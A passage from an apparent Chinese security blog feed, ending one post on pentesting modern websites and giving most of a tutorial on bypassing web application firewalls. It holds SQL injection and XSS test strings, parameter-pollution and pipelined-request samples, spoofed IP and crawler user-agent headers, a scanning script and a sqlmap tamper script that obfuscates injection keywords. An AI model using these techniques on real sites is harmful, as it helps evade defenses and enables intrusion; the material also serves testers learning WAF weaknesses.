???，这个你怎么不在接入处处理</p></blockquote><h2 id="多服务端"><a class="markdownIt-Anchor" href="#多服务端"></a> 多服务端</h2><p>提供了多平台客户端， 这就对渗透测试多平台渗透能力发出了挑战。不但要会web，还要会安卓/ios渗透测试， 反编译(客户端总是会有一些未公开的api)。甚至还有IOT。</p><h2 id="风控"><a class="markdownIt-Anchor" href="#风控"></a> 风控</h2><p>好的风控系统基本阻止了邮箱/短信轰炸。对需要爆破的漏洞也降低了危害。</p><h2 id="xass"><a class="markdownIt-Anchor" href="#xass"></a> Xass</h2><p>Sass， Pass，Iass等各种服务公司不断涌现， 可能出现刚拿下shell，想内网渗透，发现实际上服务是在某Sass上。或者发现服务api是在Fass上的，根本没有服务器。这涉及到云安全。</p><p>参考：<a href="https://code84.com/837800.html">https://code84.com/837800.html</a></p><p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/574e9258d109b3de5413a7bf5412bc8b820a4cf5.png@f_auto" alt="img" /></p><h2 id="虚拟化"><a class="markdownIt-Anchor" href="#虚拟化"></a> 虚拟化</h2><p>docker提供了优秀的服务分离，就算拿到了shell，也只是拿到了容器的shell。 容器虚拟化不一定安全，但是现在对这方面的研究还不是很多， 完全没有对绕过UAC的研究多。</p><h1 id="对安全教程的思考"><a class="markdownIt-Anchor" href="#对安全教程的思考"></a> 对安全教程的思考</h1><p>现在一些安全教程还是停留在旧时代， <code>' and 1=1</code>，<code>&lt;/x&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>固然是基础，挖掘思路也很重要。但是随着技术的发展， 渗透和开发技术也会走的更近， 新开发技术的爆发式增长，不可能像列中间件漏洞一样全部写出它们的渗透技术。就算有人写出来，等写出来黄花菜都凉了。安全教程应该更强调编程， 而不是培养只会用扫描器的驻场工程师。</p><h1 id="对安全工具的思考"><a class="markdownIt-Anchor" href="#对安全工具的思考"></a> 对安全工具的思考</h1><h2 id="扫描器"><a class="markdownIt-Anchor" href="#扫描器"></a> 扫描器</h2><p>随着技术的扩散，老式扫描器未来会面临失效。不支持浏览器模拟，只会抓a标签的扫描器， 对前后端分离无能为力。 基于流量和基于爬虫的扫描器会合并， 走向模拟获取流量进行扫描的模式对app的扫描器目前不支持对web的渗透测试。</p><h2 id="人工智能"><a class="markdownIt-Anchor" href="#人工智能"></a> 人工智能</h2><p>人工智能火热，各路安全公司都号称使用了AI技术(实际上怎么样就不知道了)。 除了使用AI技术对AI进行对抗， AI扫描器也在发展中。<br />这部分知识，我推荐兜哥的AI安全三部曲。</p><p>可以重复的渗透测试动作，AI都可以模拟。随着发展，只会重复的渗透人员会面临淘汰。也能让安全人员拿出精力进行安全研究，而不是重复性的测试。</p><h1 id="尾言"><a class="markdownIt-Anchor" href="#尾言"></a> 尾言</h1><p>现在正是承前启后的时代，旧的开发技术未被淘汰，新的开发技术正在发展， 谁会在这个时代引领潮流， 或是被淘汰。让我们拭目以待吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;首先定义本文所说的现代化网站。 现代化网站是指符合以下多个特征的对外服务。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;储存，数据库，网站程序等服务器高度分离&lt;/</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透技巧" scheme="https://j3f5.github.io/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>WAF绕过-一般性绕过总结</title>
    <link href="https://j3f5.github.io/articles/2023/06/12/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <id>https://j3f5.github.io/articles/2023/06/12/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
    <published>2023-06-12T07:03:07.000Z</published>
    <updated>2023-06-14T07:03:07.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/WAF%E7%BB%95%E8%BF%87-16867110382132.png" alt="WAF绕过" /></p><h1 id="基础绕过"><a class="markdownIt-Anchor" href="#基础绕过"></a> 基础绕过</h1><p>基础绕过一般是针对于payload的绕过，之前迪哥也在各个章节多少有提到过，这里做一些总结。参考文献有：</p><ol><li><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/07.WAF%E7%BB%95%E8%BF%87/01.WAF%E7%BB%95%E8%BF%87%E9%80%9A%E7%94%A8%E6%80%9D%E8%B7%AF.html">https://blog.gm7.org/个人知识库/01.渗透测试/07.WAF绕过/01.WAF绕过通用思路.html</a></li><li><a href="https://www.anquanke.com/post/id/212272#h2-11">https://www.anquanke.com/post/id/212272#h2-11</a></li></ol><h2 id="双写-大小写"><a class="markdownIt-Anchor" href="#双写-大小写"></a> 双写、大小写</h2><p>略</p><h2 id="编码"><a class="markdownIt-Anchor" href="#编码"></a> 编码</h2><p>这里要说一下：</p><ol><li><p>对于get方法来说，都是把数据串联在请求的url后面作为参数，然后对后面的参数进行URL-ENCODE编码。</p><blockquote><p>URL encode的过程就是把部分url作为字符，按照某种编码方式（如：utf-8，gbk等）编码成二进制的字节码，然后每个字节用一个包含3个字符的字 符串 “%xy” 表示，其中xy为该字节的两位十六进制表示形式。</p></blockquote></li><li><p>对于post方法来说，他将使用<code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=字符集（GBK，utf-8等）&quot;/&gt;</code>中的<code>charset</code>字段定义编码。有四种方式：</p><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>application/x-www-form-urlencoded</td><td>在发送前编码所有字符（默认）</td></tr><tr><td>multipart/form-data</td><td>不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。</td></tr><tr><td>application/json</td><td></td></tr><tr><td>text/plain</td><td>空格转换为 “+” 加号，但不对特殊字符编码。</td></tr><tr><td>text/html</td><td>html编码</td></tr></tbody></table></li></ol><p>所以编码可以分为：</p><ol><li>URL编码</li><li>HTML编码</li><li>Base64编码</li><li>Unicode编码</li><li>十六进制编码</li><li><strong>其他后端会解析的编码</strong></li></ol><h2 id="注释"><a class="markdownIt-Anchor" href="#注释"></a> 注释</h2><h2 id="垃圾字符"><a class="markdownIt-Anchor" href="#垃圾字符"></a> 垃圾字符</h2><p>一般waf只会拦截一点点，只要超过这个长度就不检测，所以可以把Payload写在后面</p><h2 id="分块传输"><a class="markdownIt-Anchor" href="#分块传输"></a> 分块传输</h2><p>严格来说分块传输并不是一种编码解码机制，但是从实际效果来看，大家都把分块传输当成是一种特殊的编码解码办法。里面的很多技巧和编码解码有相似之处。分块传输，又称为Http Chunked。分块传输本身适用于解决大文件传输的问题，属于http标准的协议功能，所有的WEB服务器均支持分块传输。在绕过WAF的测试中，分块传输也是属于编码/解码的一种。只需要设置如下头即可。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。</p><p>burp插件：<a href="https://github.com/c0ny1/chunked-coding-converter.git">https://github.com/c0ny1/chunked-coding-converter.git</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20230613140646587.png" alt="image-20230613140646587" style="zoom:67%;" /><h2 id="http"><a class="markdownIt-Anchor" href="#http"></a> HTTP</h2><h3 id="http-09"><a class="markdownIt-Anchor" href="#http-09"></a> HTTP 0.9</h3><p>HTTP 0.9协议只有GET方法，且没有HEADER信息等，WAF就可能认不出这种的请求包，于是达到绕过WAF的效果</p><h3 id="https与http"><a class="markdownIt-Anchor" href="#https与http"></a> HTTPS与HTTP</h3><p>http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护</p><h3 id="参数污染"><a class="markdownIt-Anchor" href="#参数污染"></a> 参数污染</h3><p>在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次，但是不同服务器的处理方式会不一样。注意每种服务器获取到的参数的位置不同，例如apache是最后一个。</p><p>注入样例：<code>bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3</code>。apache获取到最后一个，而waf服务器（tomcat）只解析重复参数里面的前者。</p><table><thead><tr><th>Web环境</th><th>参数获取函数</th><th>获取到的参数</th></tr></thead><tbody><tr><td>PHP/Apache</td><td>$_GET(“par”)</td><td>last</td></tr><tr><td>JSP/Tomcat</td><td>Request.getParameter(“par”)</td><td>first</td></tr><tr><td>Perl(CGI)/Apache</td><td>Param(“par”)</td><td>first</td></tr><tr><td>Python/Apache</td><td>getvalue(“par”)</td><td>[“first”,“last”]</td></tr><tr><td><a href="http://ASP.NET/IIS">ASP.NET/IIS</a></td><td>Request.QueryString(“par”)</td><td>first,last</td></tr></tbody></table><h3 id="pipelinekeep-alive"><a class="markdownIt-Anchor" href="#pipelinekeep-alive"></a> Pipeline（keep-alive）</h3><p>http请求头部中有<code>Connection</code>这个字段，建立的tcp连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成<code>keep-alive</code>，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束<code>Connection</code>为<code>close</code>为止</p><p>我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf</p><blockquote><p>记得把brupsuite自动更新<code>Content-Length</code>的勾去掉</p></blockquote><p>参考数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">a=1GET / HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h3 id="http-charset"><a class="markdownIt-Anchor" href="#http-charset"></a> HTTP charset</h3><p>利用<code>Content-Type: xxx;charset=xxx</code>编码绕过，payload转义后，由于大部分的WAF默认用UTF8编码检测，所以能用此方法来达到绕过关键词过滤的效果。</p><p>需要了解上面的编码绕过相关知识，针对的是post。</p><h2 id="waf特性"><a class="markdownIt-Anchor" href="#waf特性"></a> Waf特性</h2><h3 id="云waf"><a class="markdownIt-Anchor" href="#云waf"></a> 云waf</h3><p>写host地址，直达真正的地址，不经过云转发即可！</p><h3 id="白名单绕过"><a class="markdownIt-Anchor" href="#白名单绕过"></a> 白名单绕过</h3><p>一些WAF为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。</p><h4 id="ip白名单"><a class="markdownIt-Anchor" href="#ip白名单"></a> IP白名单</h4><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。</p><p>测试方法：修改http的header来bypasswaf</p><blockquote><p>X-forwarded-for</p><p>X-remote-IP</p><p>X-originating-IP</p><p>x-remote-addr</p><p>X-Real-ip</p></blockquote><h4 id="静态资源"><a class="markdownIt-Anchor" href="#静态资源"></a> 静态资源</h4><p>特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测</p><p>效率，不去检测这样一些静态文件名后缀的请求。</p><blockquote><p><a href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a></p><p><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p></blockquote><p>备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别</p><h4 id="url白名单"><a class="markdownIt-Anchor" href="#url白名单"></a> url白名单</h4><p>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势</p><h3 id="content-type绕过"><a class="markdownIt-Anchor" href="#content-type绕过"></a> Content-Type绕过</h3><p>一些WAF识别到特定的content-type后，则会判定为该请求的类型，如：</p><p>发现<code>Content-Type</code>为<code>multipart/form-data</code>时，会认为这属于文件上传的请求，从而只检测文件上传漏洞，导致不拦截其他类型的payload</p><h3 id="请求方式绕过"><a class="markdownIt-Anchor" href="#请求方式绕过"></a> 请求方式绕过</h3><ol><li><p>一些WAF对于<code>get</code>请求和<code>post</code>请求的处理机制不一样，可能对POST请求稍加松懈，因此给<code>GET</code>请求变成<code>POST</code>请求有可能绕过拦截。</p></li><li><p>一些WAF检测到<code>POST</code>请求后，就不会对<code>GET</code>携带的参数进行过滤检测，因此导致被绕过。</p></li><li><p>一些WAF检测到HEAD等等请求后，会直接拦截（因为不像是人的操作）</p></li></ol><h3 id="解析兼容性"><a class="markdownIt-Anchor" href="#解析兼容性"></a> 解析兼容性</h3><p>这个之前说过，举个例子：如果waf是检测<code>filename=&quot;&quot;</code>的最后一个<code>&quot;</code>，那么，只要我们这样构造：<code>filename=&quot;sss&quot;s.php</code>他就不拦截了，会保存为<code>s.php</code>。</p><h2 id="容器特性"><a class="markdownIt-Anchor" href="#容器特性"></a> 容器特性</h2><h3 id="iisasp"><a class="markdownIt-Anchor" href="#iisasp"></a> IIS+ASP</h3><ol><li><code>%</code>会被自动去掉</li><li>unicode会自动解码</li></ol><h3 id="tomcat"><a class="markdownIt-Anchor" href="#tomcat"></a> Tomcat</h3><p>路径穿越</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure><h1 id="信息搜集绕过waf"><a class="markdownIt-Anchor" href="#信息搜集绕过waf"></a> 信息搜集绕过waf</h1><p>一般对网站进行扫描的时候，都会产生大量数据包，一些网站对将之识别为CC攻击等等。</p><p>如果遇到这种防护，分WAF的类别，例如有阿里云的网站服务器适配、有宝塔等等软件waf等。一般都自己写代码来实现绕过。</p><p>那么我们有如下绕过方式</p><h2 id="模拟用户请求"><a class="markdownIt-Anchor" href="#模拟用户请求"></a> 模拟用户请求</h2><p>即使用常用的UA和常用的请求方式：GET/POST等。</p><h2 id="延时"><a class="markdownIt-Anchor" href="#延时"></a> 延时</h2><p>设置延时，每3秒扫一条（阿里云的限制）</p><h2 id="模拟爬虫"><a class="markdownIt-Anchor" href="#模拟爬虫"></a> 模拟爬虫</h2><p>一般waf为了保证网站被收录，不会拦截爬虫。所以在UA上设置成爬虫即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">百度爬虫，第二条为百度图片爬虫</span><br><span class="line">Baiduspider+(+http://www.baidu.com/search/spider.htm&quot;)</span><br><span class="line">Baiduspider-image</span><br><span class="line">google爬虫，最后一条为google图片搜索爬虫</span><br><span class="line">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br><span class="line">Googlebot/2.1 (+http://www.googlebot.com/bot.html)</span><br><span class="line">Googlebot/2.1 (+http://www.google.com/bot.html)</span><br><span class="line">Googlebot-Image/1.0</span><br><span class="line">即刻搜索爬虫</span><br><span class="line">Mozilla/5.0 (compatible; JikeSpider; +http://shoulu.jike.com/spider.html)</span><br><span class="line">雅虎爬虫（分别是雅虎中国和美国总部的爬虫）</span><br><span class="line">Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html&quot;)</span><br><span class="line">Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp&quot;)</span><br><span class="line">新浪爱问爬虫</span><br><span class="line">iaskspider/2.0(+http://iask.com/help/help_index.html&quot;)</span><br><span class="line">Mozilla/5.0 (compatible; iaskspider/1.0; MSIE 6.0)</span><br><span class="line">搜狗爬虫,第三条为搜狗图片爬虫</span><br><span class="line">Sogou web spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)</span><br><span class="line">Sogou Push Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)</span><br><span class="line">Sogou Pic Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)</span><br><span class="line">搜搜爬虫</span><br><span class="line">Sosospider+(+http://help.soso.com/webspider.htm)</span><br><span class="line">网易有道爬虫</span><br><span class="line">Mozilla/5.0 (compatible; YoudaoBot/1.0; http://www.youdao.com/help/webmaster/spider/; )</span><br><span class="line">MSN爬虫</span><br><span class="line">msnbot/1.0 (+http://search.msn.com/msnbot.htm)</span><br></pre></td></tr></table></figure><h2 id="代理池"><a class="markdownIt-Anchor" href="#代理池"></a> 代理池</h2><p>因为延时很慢，所以有代理池，使用不同的IP请求，这些IP会转发包回你的IP。免费的代理池很有可能被识别出来，最好用付费的。例如：<a href="https://www.kuaidaili.com/">快代理</a>。当然，也有免费的：<a href="https://blog.csdn.net/weixin_48584917/article/details/121710521">proxy pool</a></p><p>代理代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搜索引擎爬虫模拟及模拟真实用户</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="comment">#模拟用户 Kit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span></span><br><span class="line"><span class="comment">#模拟引擎 Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span></span><br><span class="line"><span class="comment">#更多爬虫引擎：https://www.cnblogs.com/iack/p/3557371.html</span></span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; Baiduspider-render/2.0;</span></span><br><span class="line"><span class="string">+http://www.baidu.com/search/spider.html)&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;document&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>:</span><br><span class="line"><span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/si</span></span><br><span class="line"><span class="string">gned-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;none&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;navigate&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="string">&#x27;?1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;xxx&#x27;</span>,<span class="comment">#根据当前访问 cookie</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> paths <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;php_b.txt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">url=<span class="string">&#x27;http://192.168.0.103:8081/&#x27;</span></span><br><span class="line">paths=paths.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">urls=url+paths</span><br><span class="line"><span class="comment">#如需测试加代理，或加入代理池需加代理</span></span><br><span class="line">proxy = &#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:7777&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        code=requests.get(urls,headers=headers,verify=<span class="literal">False</span>).status_code</span><br><span class="line"><span class="built_in">print</span>(urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(code))</span><br><span class="line"><span class="keyword">if</span> code==<span class="number">200</span> <span class="keyword">or</span> code==<span class="number">403</span>:</span><br><span class="line"><span class="built_in">print</span>(urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(code))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;connecting error&#x27;</span>)</span><br><span class="line"><span class="comment">#time.sleep(3)模拟用户需延时 引擎可用可不用（根据请求速度）</span></span><br></pre></td></tr></table></figure><h2 id="白名单机制上面有提到"><a class="markdownIt-Anchor" href="#白名单机制上面有提到"></a> 白名单机制（上面有提到）</h2><h1 id="漏洞发现绕过waf"><a class="markdownIt-Anchor" href="#漏洞发现绕过waf"></a> 漏洞发现绕过waf</h1><p>其实思路和上面一样，多了一些就是对流量特征的更改。现在说一下联动：</p><h2 id="awvsburpxray-漏扫-payload-绕过-延时被动"><a class="markdownIt-Anchor" href="#awvsburpxray-漏扫-payload-绕过-延时被动"></a> awvs+burp+xray 漏扫 Payload 绕过-延时，被动</h2><ol><li>awvs设置<ol><li>慢扫</li><li>UA改为爬虫UA</li><li>设置转发</li></ol></li><li>Burp<ol><li>设置代理转发</li></ol></li><li>XRAY<ol><li>监听</li></ol></li></ol><p><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20230613151222688.png" alt="image-20230613151222688" /></p><p>因为AWVS有慢速扫描还好，如果没有的话，就需要BURP来控制速度（可以安装一个按键精灵，哈哈哈哈），这样才能控制XRAY。</p><p>因为每个工具识别漏洞的Payload不一样，所以才可能不会被识别，<strong>所以才有联动这一说法</strong>。如果存在一款可以自己改Payload特征啥（有HTTP头的更改啥的）的就好了，而且需要控制速度，这通常需要我们自己写。</p><h1 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h1><p>这里将不讨论常用的绕过，重点在于工具的绕过以及工具的流量特征。</p><h2 id="sql注入sqlmap特征"><a class="markdownIt-Anchor" href="#sql注入sqlmap特征"></a> sql注入（sqlmap特征）</h2><p>【特征1】攻击产生的流量非常多，一般都会触发cc攻击的防御机制，所以一般会使用<code>--delay</code>或者代理池</p><p>【特征2】默认参数，产生的流量如下，其ua头有sqlmap字样，很容易辨认，所以一般会使用参数<code>--random-agent</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /pikachu/vul/sqli/sqli_str.php?name=admin&amp;submit=查询 HTTP/1.1</span><br><span class="line">CACHE-CONTROL: no-cache</span><br><span class="line">CONNECTION: close</span><br><span class="line">USER-AGENT: sqlmap/1.5.8#stable (http://sqlmap.org)</span><br><span class="line">ACCEPT: */*</span><br><span class="line">HOST: 192.168.68.78</span><br><span class="line">ACCEPT-ENCODING: gzip,deflate</span><br></pre></td></tr></table></figure><p>【特征3】 xss测试语句、随机数的位数</p><p>【特征4】注入流程/句子比较固定</p><p>综合上述，我们可以自己写tamper来替代一些注入句子，更改特征</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload,**kwargs</span>):</span><br><span class="line">    retVal =<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;union&quot;</span>,<span class="string">&quot;%23a%0aunion&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;/*!4457select*/&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;%20&quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;database()&quot;</span>,<span class="string">&quot;database%23a%0a()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>所以，最终的payload为：</p><figure class="highlight 